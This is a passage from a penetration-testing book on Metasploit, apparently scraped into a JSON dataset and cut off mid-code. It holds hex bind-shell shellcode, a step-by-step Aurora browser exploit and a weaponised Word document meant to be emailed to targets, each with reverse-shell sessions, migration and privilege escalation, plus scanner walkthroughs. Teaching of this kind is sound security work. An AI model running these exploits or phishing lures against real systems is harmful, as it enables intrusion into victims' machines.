shellcode in the preceding example works. On your Windows XP\ntarget, download and install Immunity Debugger from http://www.immunityinc\n.com/. We’ll use the msfpayload command to generate sample shellcode for a\nsimple TCP bind shell, listening on port 443. As you learned in previous\n112 Chapter 8\nchapters, a bind shell simply listens on a port on a target machine to which\nwe can connect.\nroot@bt:/opt/framework3/msf3# msfpayload windows/shell/bind_tcp LPORT=443 C\nWhen these commands are executed, “stage 1” and “stage 2” shellcodes\nare created in the output. We are concerned only with the stage 1 shellcode,\nbecause Metasploit will handle sending the second stage for us when we con-\nnect to it. Copy and paste the shellcode from stage 1 into a text editor of your\nchoice. You’ll need to do some minor editing before proceeding.\nNow that you have your basic shellcode, add as many NOPs as you want\nto the beginning of it (such as \\x90\\x90\\x90\\x90\\x90). Then remove all \\x\noccurrences so it looks similar to the following:\n909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090f\nce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f0\n52578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c\n738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe058\n5f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504\n050405068ea0fdfe0ffd59731db5368020001bb89e66a10565768c2db3767ffd5535768b7e938ffffd553535768\n74ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5f\nfd593536a005653576802d9c85fffd501c329c685f675ecc3\nAll this is necessary because you need to use a particular format so that\nImmunity Debugger will accept your copy-and-paste of assembly instructions.\nNow you have a bind shell with some NOPs in front of it for testing. Next,\nopen up any executable—let’s use iexplore.exe for this example. Open Immu-\nnity Debugger, choose File(cid:23)Open, and point to an executable. You should\nsee a number of assembly instructions in the main window (the largest one).\nLeft-click the first instruction on the screen, and hold down SHIFT while left-\nclicking to highlight about 300 instructions below it.\nCopy the shellcode to the clipboard, and right-click in the Immunity\nDebugger window and choose Binary(cid:23)Binary paste. This will paste the\nassembly instructions from the example into the Immunity Debugger window.\n(Remember that we are doing this to identify how NOPs work and how\nassembly instructions are executed.)\nYou can see in Figure 8-1 that a number of NOPs are inserted; if you\nwere to scroll down, you would see your shellcode.\nWhen we first exported our shellcode in a bind_tcp format, the last instruc-\ntion through stage 1 ended with ecc3. Locate the last set of memory instructions\nwe added ending in ecc3.\nRight after the ecc3, press F2 to create a breakpoint. When you add a\nbreakpoint, once execution flow encounters it, program execution will pause\nand will not continue. This is important here, because the code still has a lot\nof the old remnants of the application we opened, and continuing would\ncause the application to crash, because we already inserted our own code\ninto it. We want to stop and investigate what happened before the applica-\ntion crashes.\nExploitation Using Client-Side Attacks 113\nFigure 8-1: Examples of multiple NOPs that create the NOP slide\nIn the example in Figure 8-2, notice the last instruction set, which is a C3.\nThat is the last instruction set in our bind shell that we need.\nAfter that C3, press F2, which sets up another breakpoint. Now we’re\nready to roll and see what happens. Go back to the very top, where you\nadded your NOPs, and press F7, which tells the debugger to execute the\nnext assembly command, stepping into your next assembly instruction.\nNotice that the highlight moves down one line. Nothing happened because\nyou added a NOP.\nNext, press F7 a few times to walk down the NOP slide. When you first\narrive at the memory instructions, open up a command prompt and type\nnetstat -an. Nothing should be listening on 443, and this is a good sign that\nyour payload hasn’t executed yet.\nPress F5 to continue running the rest of the application until it reaches\nthe breakpoint that you set. You should see the breakpoint indicated in the\nlower-left corner of the Immunity Debugger window. At this point, you have\nexecuted your payload within the debugger, and you should now be able to\ncheck netstat -an and notice port 443 listening.\nOn a remote machine, try to telnet to the target machine on port 443. You’ll\nnotice that nothing happens; this is because the listener hasn’t received the sec-\nond stage from Metasploit yet. On your Back|Track VM, go into Metasploit\nand set up a multi-handler. This will tell Metasploit that a first-stage listener\nis on port 443 on the target machine.\n114 Chapter 8\nFigure 8-2: The last part of our instruction set that we need\nmsf > use multi/handler\nmsf exploit(handler) > set payload windows/shell/bind_tcp\npayload => windows/shell/bind_tcp\nmsf exploit(handler) > set LPORT 443\nLPORT => 443\nmsf exploit(handler) > set RHOST 192.168.33.130\nRHOST => 192.168.33.130\nmsf exploit(handler) > exploit\n[*] Starting the payload handler...\n[*] Started bind handler\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.33.129:60463 -> 192.168.33.130:443)\nYou have reached a basic command shell! As a good practicing technique,\ntry a stage 1 Meterpreter reverse and see if you can get a connection. When\nyou are finished, simply close the Immunity Debugger window and you’re all\ndone. It’s important that you get familiar with Immunity Debugger now,\nbecause we will be leveraging it in later chapters. Now let’s launch our first\nbrowser exploit that uses a heap spray.\nExploitation Using Client-Side Attacks 115\nExploring the Internet Explorer Aurora Exploit\nYou know the basics of how heap sprays work and how you can dynamically\nallocate memory and fill the heap up with NOPs and shellcode. We’ll be\nleveraging an exploit that uses this technique and something found in nearly\nevery client-side exploit. The browser exploit of choice here is the Aurora\nexploit (Microsoft Security Bulletin MS10-002). Aurora was most notoriously\nused in the attacks against Google and more than 20 other large technology\ncompanies. Although this exploit was released in early 2010, it particularly\nresonates with us because it took down some major players in the technology\nindustry.\nWe’ll start by using the Aurora Metasploit module and then set our pay-\nload. The following commands should be familiar, because we have used\nthem in previous chapters. You’ll also see a couple of new options that we’ll\ndiscuss in a bit.\nmsf > use windows/browser/ms10_002_aurora\nmsf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms10_002_aurora) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nSRVHOST 0.0.0.0 (cid:88) yes The local host to listen on.\nSRVPORT 8080 (cid:89) yes The local port to listen on.\nSSL false no Negotiate SSL for incoming connections\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nURIPATH (cid:90) no The URI to use for this exploit (default is random)\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process\nLHOST yes The local address\nLPORT 4444 yes The local port\nExploit target:\nId Name\n-- ----\n0 Automatic\nmsf exploit(ms10_002_aurora) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(ms10_002_aurora) > set URIPATH / (cid:91)\nURIPATH => /\n116 Chapter 8\nmsf exploit(ms10_002_aurora) > set LHOST 192.168.33.129\nLHOST => 192.168.33.129\nmsf exploit(ms10_002_aurora) > set LPORT 443\nLPORT => 443\nmsf exploit(ms10_002_aurora) > exploit -z\n[*] Exploit running as background job.\nmsf exploit(ms10_002_aurora) >\n[*] Started reverse handler on 192.168.33.129:443\n[*] Using URL: http://0.0.0.0:80/\n[*] Local IP: http://192.168.33.129:80/\n[*] Server started.\nmsf exploit(ms10_002_aurora) >\nFirst, notice that the default setting for SRVHOST (cid:88) is 0.0.0.0: This means\nthat the web server will bind to all interfaces. The SRVPORT at (cid:89), 8080, is the\nport to which the targeted user needs to connect for the exploit to trigger.\nWe will be using port 80 instead of 8080, however. We could also set up the\nserver for SSL, but for this example, we’ll stick with standard HTTP. URIPATH (cid:90)\nis the URL the user will need to enter to trigger the vulnerability, and we set\nthis to a slash (/) at (cid:91).\nWith our settings defined, use your Windows XP virtual machine and\nconnect to the attacker using http://<attacker’s IP address>. You’ll notice the\nmachine becomes a bit sluggish. After a little waiting, you should see a Meter-\npreter shell. In the background, the heap spray was performed and the jump\ninto the dynamic memory was executed, to hit your shellcode eventually. If\nyou open Task Manager in Windows before you run this exploit, you can\nactually see the memory for iexplore.exe growing significantly based on the\ncontact growth of the heap.\nmsf exploit(ms10_002_aurora) >\n[*] Sending Internet Explorer \"Aurora\" Memory Corruption to client 192.168.33.130\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1161)\nmsf exploit(ms10_002_aurora) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter >\nYou now have a Meterpreter shell, but there’s a slight problem. What if\nthe targeted user closes the browser based on the sluggishness of her com-\nputer? You would effectively lose your session to the target, and although the\nexploit is successful, it would be cut off prematurely. Fortunately, there is a way\naround this: Simply type run migrate as soon as the connection is established, and\nhope that you make it in time. This Meterpreter script automatically migrates\nto the memory space of a separate process, usually lsass.exe, to improve the\nchances of keeping your shell open if the targeted user closes the originally\nexploited process.\nExploitation Using Client-Side Attacks 117\nmeterpreter > run migrate\n[*] Current server process: IEXPLORE.EXE (2120)\n[*] Migrating to lsass.exe...\n[*] Migrating into process ID 680\n[*] New server process: lsass.exe (680)\nmeterpreter >\nThis is a pretty manual process. You can automate this whole process\nusing some advanced options to migrate to a process automatically upon a\nsuccessful shell. Type show advanced to list the advanced features of the Aurora\nmodule:\nmsf exploit(ms10_002_aurora) > show advanced\nModule advanced options:\nName : ContextInformationFile\nCurrent Setting:\nDescription : The information file that contains context information\nName : DisablePayloadHandler\nCurrent Setting: false\nDescription : Disable the handler code for the selected payload\nName : EnableContextEncoding\nCurrent Setting: false\nDescription : Use transient context when encoding payloads\nName : WORKSPACE\nCurrent Setting:\nDescription : Specify the workspace for this module\nPayload advanced options (windows/meterpreter/reverse_tcp):\nName : AutoLoadStdapi\nCurrent Setting: true\nDescription : Automatically load the Stdapi extension\nName : AutoRunScript\nCurrent Setting:\nDescription : A script to run automatically on session creation.\nName : AutoSystemInfo\nCurrent Setting: true\nDescription : Automatically capture system information on initialization.\nName : InitialAutoRunScript\nCurrent Setting:\nDescription : An initial script to run on session created (before AutoRunScript)\nName : ReverseConnectRetries\nCurrent Setting: 5\nDescription : The number of connection attempts to try before exiting the process\n118 Chapter 8\nName : WORKSPACE\nCurrent Setting:\nDescription : Specify the workspace for this module\nmsf exploit(ms10_002_aurora) >\nBy setting these options, you can fine-tune a lot of the payload and exploit\ndetails. Now suppose you wanted to change the amount of tries a reverse con-\nnection would do. The default is 5, but you might be concerned with timeouts\nand want to increase the connection retries. Here, we set it to 10:\nmsf exploit(ms10_002_aurora) > set ReverseConnectRetries 10\nIn this case, you want to migrate automatically to a new process in case\nthe targeted user closes the browser right away. Under the AutoRunScript, sim-\nply let Metasploit know to autorun a script as soon as a Meterpreter console is\ncreated. Using the migrate command with the -f switch tells Meterpreter to\nlaunch a new process automatically and migrate to it:\nmsf exploit(ms10_002_aurora) > set AutoRunScript migrate -f\nNow attempt to run the exploit and see what happens. Try closing the\nconnection and see if your Meterpreter session still stays active.\nSince this is a browser-based exploit, you will most likely be running as a\nlimited user account. Remember to issue the use priv and getsystem commands\nto attempt privilege escalation on the target machine.\nThat’s it! You just successfully executed your first client-side attack using\na pretty famous exploit. Note that new exploits are frequently being released,\nso be sure to search for all the browser exploits and find which one best suits\nyour needs for a particular target.\nFile Format Exploits\nFile format bugs are exploitable vulnerabilities found within a given applica-\ntion, such as an Adobe PDF document. This class of exploit relies on a user\nactually opening a malicious file in a vulnerable application. Malicious files\ncan be hosted remotely or sent via email. We briefly mentioned leveraging\nfile format bugs as a spear-phishing attack in the beginning of this chapter,\nand we’ll offer more about spear-phishing in Chapter 10.\nIn traditional file format exploits, you could leverage anything to which\nyou think your target will be susceptible. This could be a Microsoft Word\ndocument, a PDF, an image, or anything else that might be applicable. In\nthis example, we’ll be leveraging MS11-006, known as the Microsoft Win-\ndows CreateSizedDIBSECTION Stack Buffer Overflow.\nWithin Metasploit, perform a search for ms11_006. Our first step is to get\ninto our exploit through msfconsole, and type info to see what options are\nExploitation Using Client-Side Attacks 119\navailable. In the next example, you can see that the file format is exported as\na document:\nmsf > use windows/fileformat/ms11_006_createsizeddibsection\nmsf exploit(ms11_006_createsizeddibsection) > info\n. . . SNIP . . .\nAvailable targets:\nId Name\n-- ----\n0 Automatic\n1 Windows 2000 SP0/SP4 English\n2 Windows XP SP3 English\n3 Crash Target for Debugging\nNext, you can see that we have a few targets available to use, but we’ll\nmake it automatic and leave everything at the default settings:\nBasic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nFILENAME msf.doc yes The file name.\nOUTPUTPATH /opt/metasploit3/msf3/data/exploits yes The location of the file.\nWe’ll need to set a payload as usual. In this case, we will select our first\nchoice, a reverse Meterpreter shell:\nmsf exploit(ms11_006_createsizeddibsection) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms11_006_createsizeddibsection) > set LHOST 172.16.32.128\nLHOST => 172.16.32.128\nsmsf exploit(ms11_006_createsizeddibsection) > set LPORT 443\nLPORT => 443\nmsf exploit(ms11_006_createsizeddibsection) > exploit\n[*] Creating 'msf.doc' file...(cid:88)\n[*] Generated output file /opt/metasploit3/msf3/data/exploits/msf.doc(cid:89)\nmsf exploit(ms11_006_createsizeddibsection) >\nSending the Payload\nOur file was exported as msf.doc (cid:88) and sent to the /opt/ (cid:89) directory within\nMetasploit. Now that we have our malicious document, we can craft up an\nemail to our target and hope the user opens it. At this point, we should\nalready have an idea of the target’s patch levels and vulnerabilities. Before\nweactually open the document, we need to set up a multi-handler listener.\nThis will ensure that when the exploit is triggered, the attacker machine can\nreceive the connection back from the target machine (reverse payload).\n120 Chapter 8\nmsf exploit(ms11_006_createsizeddibsection) > use multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 172.16.32.128\nLHOST => 172.16.32.128\nmsf exploit(handler) > set LPORT 443\nLPORT => 443\nmsf exploit(handler) > exploit -j\n[*] Exploit running as background job.\n[*] Started reverse handler on 172.16.32.128:443\n[*] Starting the payload handler...\nmsf exploit(handler) >\nWe open the document on a Windows XP virtual machine, and we\nshould be presented with a shell (provided our VM is Windows XP SP3):\nmsf exploit(handler) >\n[*] Sending stage (749056 bytes) to 172.16.32.131\n[*] Meterpreter session 1 opened (172.16.32.128:443 -> 172.16.32.131:2718) at\nSun Apr 03 21:39:58 -0400 2011\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter >\nWe have successfully exploited a file format vulnerability by creating a\nmalicious document through Metasploit and then sending it to our targeted\nuser. Looking back at this exploit, if we had performed proper reconnaissance\non our target user, we could have crafted a pretty convincing email. This exploit\nis one example of a number of file format exploits available in Metasploit.\nWrapping Up\nWe covered how client-side exploits generally work by manipulating the heap\nto work in the attacker’s favor. We covered how NOP instructions work within\nan attack and how to use the basics of a debugger. You’ll learn more about\nleveraging a debugger in Chapters 14 and 15. MS11-006 was a stack-based\noverflow, which we will cover in depth in later chapters. Note that your suc-\ncess rate with these types of attacks resides in how much information you\ngain about the target before you attempt to perform the attacks.\nAs a penetration tester, every bit of information can be used to craft an\neven better attack. In the case of spear-phishing, if you can talk the language\nof the company and target your attacks against smaller business units within\nthe company that probably aren’t technical in nature, your chances of success\ngreatly increase. Browser exploits and file format exploits are typically very\neffective, granted you do your homework. We’ll cover this topic in more\ndetail in Chapters 8 and 10.\nExploitation Using Client-Side Attacks 121"
  },
  {
    "input": "",
    "summary": "",
    "output": "M E T A S P L O I T A U X I L I A R Y\nM O D U L E S\nWhen most people think of Metasploit, exploits come\nto mind. Exploits are cool, exploits get you shell, and\nexploits get all the attention. But sometimes you need\nsomething more than that. By definition, a Metasploit\nmodule that is not an exploit is an auxiliary module,\nwhich leaves a lot to the imagination.\nIn addition to providing valuable reconnaissance tools such as port\nscanners and service fingerprinters, auxiliary modules such as ssh_login can\ntake a known list of usernames and passwords and then attempt to log in\nvia brute force across an entire target network. Also included in the auxiliary\nmodules are various protocol fuzzers such as ftp_pre_post, http_get_uri_long,\nsmtp_fuzzer, ssh_version_corrupt, and more. You can launch these fuzzers at a\ntarget service in hopes of finding your own vulnerabilities to exploit.\nJust because auxiliary modules don’t have a payload, don’t think you\nwon’t use them. But before we dive into their myriad uses, here’s an overview\nto help you see what we are dealing with.\n(cid:88) root@bt:/opt/framework3/msf3/modules/auxiliary# ls –l\ntotal 52\ndrwxr-xr-x 23 root root 4096 Apr 10 03:22 admin\ndrwxr-xr-x 4 root root 4096 Dec 14 03:25 client\ndrwxr-xr-x 16 root root 4096 Jan 1 04:19 dos\ndrwxr-xr-x 8 root root 4096 Dec 14 03:25 fuzzers\ndrwxr-xr-x 3 root root 4096 May 2 15:38 gather\ndrwxr-xr-x 4 root root 4096 Dec 14 03:25 pdf\ndrwxr-xr-x 36 root root 4096 Apr 10 03:22 scanner\ndrwxr-xr-x 5 root root 4096 May 2 15:38 server\ndrwxr-xr-x 3 root root 4096 May 2 15:38 sniffer\ndrwxr-xr-x 5 root root 4096 Dec 14 03:25 spoof\ndrwxr-xr-x 4 root root 4096 Dec 14 03:25 sqli\ndrwxr-xr-x 3 root root 4096 May 2 15:38 test\ndrwxr-xr-x 3 root root 4096 May 2 15:38 voip\nAs you can see in the preceding listing, modules are installed within the\n/modules/auxiliary directory (cid:88) of the Framework, and within that, sorted\nbased on the functions they provide. Should you want to create your own\nmodule or edit an existing one to suit a specific purpose, you will find them\nin their corresponding directories. For instance, if you need to develop a\nfuzzer module to hunt your own bugs, you will find some pre-existing mod-\nules in the /fuzzers directory.\nTo list all the available auxiliary modules within Metasploit, simply issue\nthe show auxiliary command (cid:88) within msfconsole. If you compare the preceding\ndirectory listing with the module names displayed in msfconsole, you will notice\nthat the naming of the modules depends on the underlying directory struc-\nture, as shown below.\n(cid:88) msf > show auxiliary\nAuxiliary\n=========\nName Rank Description\n---- ---- -----------\nadmin/backupexec/dump normal Veritas Backup Exec Windows Remote\nFile Access\nadmin/backupexec/registry normal Veritas Backup Exec Server Registry\nAccess\nadmin/cisco/ios_http_auth_bypass normal Cisco IOS HTTP Unauthorized\nAdministrative Access\n. . . SNIP . . .\nfuzzers/ssh/ssh_version_corrupt normal SSH Version Corruption\nfuzzers/tds/tds_login_corrupt normal TDS Protocol Login Request Corruption\nFuzzer\nfuzzers/tds/tds_login_username normal TDS Protocol Login Request Username\nFuzzer\nfuzzers/wifi/fuzz_beacon normal Wireless Beacon Frame Fuzzer\nfuzzers/wifi/fuzz_proberesp normal Wireless Probe Response Frame Fuzzer\n124 Chapter 9\ngather/citrix_published_applications normal Citrix MetaFrame ICA Published\nApplications Scanner\ngather/citrix_published_bruteforce normal Citrix MetaFrame ICA Published\nApplications Bruteforcer\ngather/dns_enum normal DNS Enumeration Module\ngather/search_email_collector normal Search Engine Domain Email Address\nCollector\npdf/foxit/authbypass normal Foxit Reader Authorization Bypass\nscanner/backdoor/energizer_duo_detect normal Energizer DUO Trojan Scanner\nscanner/db2/db2_auth normal DB2 Authentication Brute Force Utility\nscanner/db2/db2_version normal DB2 Probe Utility\nAs you can see in this trimmed output, the auxiliary modules are orga-\nnized by category. At your disposal are the DNS enumeration module, Wi-Fi\nfuzzers, and even a module to locate and abuse the Trojan backdoor that was\nincluded on Energizer USB battery chargers.\nUsing an auxiliary module is similar to using any exploit within the\nFramework—simply issue the use command followed by the module name.\nFor example, to use the webdav_scanner module (explored in “Auxiliary Mod-\nules in Use” on page126), you would run use scanner/http/webdav_scanner as\nshown below.\nNOTE In auxiliary modules, the basic options are slightly different with an RHOSTS option to tar-\nget multiple machines and a THREADS value to fine-tune the speed of your scanning.\n(cid:88) msf > use scanner/http/webdav_scanner\n(cid:89) msf auxiliary(webdav_scanner) > info\nName: HTTP WebDAV Scanner\nVersion: 9179\nLicense: Metasploit Framework License (BSD)\nRank: Normal\nProvided by:\net <et@metasploit.com>\nBasic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nProxies no Use a proxy chain\n(cid:90) RHOSTS yes The target address range or CIDR identifier\nRPORT 80 yes The target port\n(cid:91) THREADS 1 yes The number of concurrent threads\nVHOST no HTTP server virtual host\nDescription:\nDetect webservers with WebDAV enabled\nmsf auxiliary(webdav_scanner) >\nMetasploit Auxiliary Modules 125\nHere we issue the use command (cid:88) for the module of interest. We can then\nget a full dump of information from the system using the info command (cid:89), as\nwell as a list of the various available options. Within the options, we see that\nthe only required option without a default is RHOSTS (cid:90), which can take a single\nIP address, list, range, or CIDR notation.\nThe other options mostly vary depending on the auxiliary module\nbeingused. For instance, the THREADS (cid:91) option allows multiple threads to\nbelaunched as part of a scan, which speeds things up exponentially.\nAuxiliary Modules in Use\nAuxiliary modules are exciting because they can be used in so many ways for\nso many things. If you can’t find the perfect auxiliary module, it’s easy to mod-\nify one to suit your specific needs.\nConsider a common example. Say you are conducting a remote penetra-\ntion test, and upon scanning the network, you identify a number of web serv-\ners and not much else. Your attack surface is limited at this point, and you\nhave to work with what is available to you. Your auxiliary scanner/http modules\nwill now prove extremely helpful as you look for low-hanging fruit against which\nyou can launch an exploit. To search for all available HTTP scanners, run\nsearch scanner/http as shown here.\nmsf auxiliary(webdav_scanner) > search scanner/http\n[*] Searching loaded modules for pattern 'scanner/http'...\nAuxiliary\n=========\nName Rank Description\n---- ---- -----------\nscanner/http/backup_file normal HTTP Backup File Scanner\nscanner/http/blind_sql_query normal HTTP Blind SQL Injection GET QUERY Scanner\nscanner/http/brute_dirs normal HTTP Directory Brute Force Scanner\nscanner/http/cert normal HTTP SSL Certificate Checker\nscanner/http/copy_of_file normal HTTP Copy File Scanner\nscanner/http/dir_listing normal HTTP Directory Listing Scanner\nscanner/http/dir_scanner normal HTTP Directory Scanner\nscanner/http/dir_webdav_unicode_bypass normal MS09-020 IIS6 WebDAV Unicode Auth Bypass\nDirectory Scanner\nscanner/http/enum_delicious normal Pull Del.icio.us Links (URLs) for a domain\nscanner/http/enum_wayback normal Pull Archive.org stored URLs for a domain\nscanner/http/error_sql_injection normal HTTP Error Based SQL Injection Scanner\nscanner/http/file_same_name_dir normal HTTP File Same Name Directory Scanner\nscanner/http/files_dir normal HTTP Interesting File Scanner\nscanner/http/frontpage_login normal FrontPage Server Extensions Login Utility\nscanner/http/http_login normal HTTP Login Utility\nscanner/http/http_version normal HTTP Version Detection\nscanner/http/lucky_punch normal HTTP Microsoft SQL Injection Table XSS\nInfection\n126 Chapter 9\nscanner/http/ms09_020_webdav_unicode_bypass normal MS09-020 IIS6 WebDAV Unicode Auth Bypass\nscanner/http/options normal HTTP Options Detection\nscanner/http/prev_dir_same_name_file normal HTTP Previous Directory File Scanner\nscanner/http/replace_ext normal HTTP File Extension Scanner\n(cid:88) scanner/http/robots_txt normal HTTP Robots.txt Content Scanner\nscanner/http/soap_xml normal HTTP SOAP Verb/Noun Brute Force Scanner\nscanner/http/sqlmap normal SQLMAP SQL Injection External Module\nscanner/http/ssl normal HTTP SSL Certificate Information\nscanner/http/svn_scanner normal HTTP Subversion Scanner\nscanner/http/tomcat_mgr_login normal Tomcat Application Manager Login Utility\nscanner/http/trace_axd normal HTTP trace.axd Content Scanner\nscanner/http/verb_auth_bypass normal HTTP Verb Authentication Bypass Scanner\nscanner/http/vhost_scanner normal HTTP Virtual Host Brute Force Scanner\nscanner/http/vmware_server_dir_trav normal VMware Server Directory Transversal\nVulnerability\nscanner/http/web_vulndb normal HTTP Vuln scanner\n(cid:89) scanner/http/webdav_internal_ip normal HTTP WebDAV Internal IP Scanner\nscanner/http/webdav_scanner normal HTTP WebDAV Scanner\nscanner/http/webdav_website_content normal HTTP WebDAV Website Content Scanner\n(cid:90) scanner/http/writable normal HTTP Writable Path PUT/DELETE File Access\nscanner/http/xpath normal HTTP Blind XPATH 1.0 Injector\nThere are a lot of options here, so let’s identify some likely candidates in\nthat list. Notice that there are the options for identifying the robots.txt (cid:88) file\nfrom various servers, numerous ways to interact with WebDAV (cid:89), tools to\nidentify servers with writable file access (cid:90), and many other special-purpose\nmodules.\nYou can see immediately that there are modules that you can use for sub-\nsequent exploration. Older versions of Microsoft IIS had a vulnerability in\ntheir WebDAV implementations that allowed for remote exploitation, so you\ncould first run a scan against your targets in hopes of finding a server with\nWebDAV enabled, as follows.\nmsf auxiliary(dir_webdav_unicode_bypass) > use scanner/http/webdav_scanner\nmsf auxiliary(webdav_scanner) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nProxies no Use a proxy chain\nRHOSTS yes The target address range or CIDR identifier\nRPORT 80 yes The target port\nTHREADS 1 yes The number of concurrent threads\nVHOST no HTTP server virtual host\n(cid:88) msf auxiliary(webdav_scanner) > set RHOSTS 192.168.1.242, 192.168.13.242.252,\n192.168.13.242.254, 192.168.4.116, 192.168.4.118, 192.168.4.122,\n192.168.13.242.251, 192.168.13.242.234, 192.168.8.67, 192.68.8.113,\n192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66, 192.168.8.68,\n192.168.6.62\nMetasploit Auxiliary Modules 127\nRHOSTS => 192.168.1.242, 192.168.13.242.252, 192.168.13.242.254, 192.168.4.116,\n192.168.4.118, 192.168.4.122, 192.168.13.242.251, 192.168.13.242.234, 192.168.8.67,\n192.168.6.113, 192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66,\n192.168.8.68, 192.168.6.62\nmsf auxiliary(webdav_scanner) > run\n[*] 192.168.1.242 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] 192.168.13.242.252 (Apache/2.2.9 (Debian) proxy_html/3.0.0 mod_ssl/2.2.9\nOpenSSL/0.9.8g) WebDAV disabled.\n[*] Scanned 04 of 31 hosts (012% complete)\n[*] Scanned 07 of 31 hosts (022% complete)\n[*] 192.168.4.116 (Apache/2.2.3 (Red Hat)) WebDAV disabled.\n[*] Scanned 10 of 31 hosts (032% complete)\n[*] 192.168.4.122 (Apache/2.2.3 (Red Hat)) WebDAV disabled.\n[*] Scanned 13 of 31 hosts (041% complete)\n[*] 192.168.13.242.251 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] 192.168.13.242.234 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 16 of 31 hosts (051% complete)\n[*] 192.168.8.67 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 19 of 31 hosts (061% complete)\n(cid:89) [*] 192.168.6.113 (Microsoft-IIS/5.0) has WEBDAV ENABLED\n[*] 192.168.13.242.231 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 22 of 31 hosts (070% complete)\n[*] 192.168.13.242.249 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 25 of 31 hosts (080% complete)\n[*] 192.168.4.115 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] 192.168.8.66 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 28 of 31 hosts (090% complete)\n[*] 192.168.8.68 (Microsoft-IIS/6.0) WebDAV disabled.\n[*] Scanned 31 of 31 hosts (100% complete)\n[*] Auxiliary module execution completed\nAs you can see in this example, a number of HTTP servers have been\nscanned in the search for WebDAV (cid:88), and only one happens to have\nWebDAV enabled (cid:89). This module has quickly identified a specific system\nagainst which you can launch further attacks.\nNOTE Auxiliary module functionality goes far beyond scanning. As you will see in Chapter 14\nauxiliary modules also work great as fuzzers with a little modification. A number of\ndenial-of-service modules are also available for Wi-Fi (including dos/wifi/deauth),\nwhich can prove quite disruptive when used properly.\nAnatomy of an Auxiliary Module\nLet’s look at the makeup of an auxiliary module in a fun little example not\ncurrently in the Metasploit repository (because it does not pertain to pene-\ntration testing). This example will demonstrate how easy it is to offload a\ngreat deal of programming to the Framework, allowing us to focus on the\nspecifics of a module.\n128 Chapter 9\nChris Gates wrote an auxiliary module for the Framework that gave his\nTwitter followers the impression that he had somehow invented a device that\nallowed him to travel at the speed of light. It makes a great example of the\ncode reuse available in Metasploit. (You can access the source of the script at\nhttp://carnal0wnage.googlecode.com/.)\n(cid:88) root@bt:/opt/framework3/msf3# cd modules/auxiliary/admin/\nroot@bt:/opt/framework3/msf3/modules/auxiliary/admin# wget http://carnal0wnage.googlecode\n.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursquare.rb\nWe’ve placed the module in our auxiliary directory (cid:88) so that it will be\navailable for use by Metasploit. But before we use this module, let’s look at\nthe actual script and break down the components so we can see exactly\nwhat the module contains.\nrequire 'msf/core'\n(cid:88) class Metasploit3 < Msf::Auxiliary\n# Exploit mixins should be called first\n(cid:89) include Msf::Exploit::Remote::HttpClient\ninclude Msf::Auxiliary::Report\nThe module begins with the first two lines importing the auxiliary class (cid:88).\nNext it makes the HTTP client functions available for use (cid:89) within the script.\n(cid:88) def initialize\nsuper(\n(cid:89)'Name' => 'Foursquare Location Poster',\n'Version => '$Revision:$',\n'Description' => 'F*ck with Foursquare, be anywhere you want to be by venue id',\n'Author' => ['CG'],\n'License' => MSF_LICENSE,\n'References' =>\n[\n[ 'URL', 'http://groups.google.com/group/foursquare-api' ],\n[ 'URL', 'http://www.mikekey.com/im-a-foursquare-cheater/'],\n]\n)\n#todo pass in geocoords instead of venueid, create a venueid, other tom foolery\nregister_options(\n[\n(cid:90)Opt::RHOST('api.foursquare.com'),\nOptString.new('VENUEID', [ true, 'foursquare venueid', '185675']), #Louvre\nParis France\nOptString.new('USERNAME', [ true, 'foursquare username', 'username']),\nOptString.new('PASSWORD', [ true, 'foursquare password', 'password']),\n], self.class)\nend\nMetasploit Auxiliary Modules 129\nWithin the initialization constructor (cid:88) we define much of the informa-\ntion (cid:89) that is reported back when issuing the info command in msfconsole.\nWe can see where the various options are defined (cid:90) and whether they are\nrequired. So far, all are pretty direct and their purposes are clear. Still, we\nhave yet to see any actual logic being performed. That comes next.\ndef run\nbegin\n(cid:88)user = datastore['USERNAME']\npass = datastore['PASSWORD']\nvenid = datastore['VENUEID']\nuser_pass = Rex::Text.encode_base64(user + \":\" + pass)\ndecode = Rex::Text.decode_base64(user_pass)\npostrequest = \"twitter=1\\n\" #add facebook=1 if you want facebook\nprint_status(\"Base64 Encoded User/Pass: #{user_pass}\") #debug\nprint_status(\"Base64 Decoded User/Pass: #{decode}\") #debug\n(cid:89)res = 